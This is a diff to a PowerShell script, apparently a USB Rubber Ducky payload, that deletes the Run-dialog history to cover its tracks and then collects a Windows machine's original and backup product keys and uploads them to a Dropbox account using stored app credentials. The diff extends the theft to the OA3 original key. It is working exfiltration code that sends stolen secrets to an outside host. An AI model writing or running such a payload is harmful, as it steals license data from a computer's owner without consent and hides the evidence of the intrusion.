@@ -5,7 +5,7 @@ $APP_SECRET = "XXXXXXXXXXXXXXX"
 Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force
 
 function Send-ToDropbox {
-  #Documentation: https://github.com/Who-Is-Julien/Ducky-Utilities/blob/main/PowerShell-Functions/Send-ToDropbox/README.md
+  # Documentation: https://github.com/PudgyTurkey/Ducky-Utilities/blob/main/PowerShell-Functions/Send-ToDropbox/README.md
 
   [CmdletBinding()]
   param(
@@ -40,6 +40,7 @@ function Send-ToDropbox {
   }
 }
 
-$ProductKey = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform").BackupProductKeyDefault | Out-String
+$ProductKey = "Original Product Key: $((Get-WmiObject -Query 'select * from SoftwareLicensingService').OA3xOriginalProductKey | Out-String)`n"
+$ProductKey += "Backup Product Key: $((Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform').BackupProductKeyDefault | Out-String)"
 
 Send-ToDropbox -RefreshToken $REFRESH_TOKEN -AppKey $APP_KEY -AppSecret $APP_SECRET -Content $ProductKey
